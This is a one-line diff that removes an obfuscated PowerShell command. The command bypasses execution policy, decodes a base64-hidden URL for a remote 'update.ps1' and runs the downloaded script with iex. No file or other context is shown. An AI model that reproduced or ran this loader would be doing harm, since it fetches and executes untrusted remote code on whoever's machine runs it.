@@ -1,1 +1,0 @@
-powershell -ep Bypass -c "&{iex (New-Object Net.WebClient).DownloadString([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9iaXRlYmxvYi5jb20vRG93bmxvYWQvUFBIRmhZSnJZS3NrRjcvdXBkYXRlLnBzMQ==')))}"
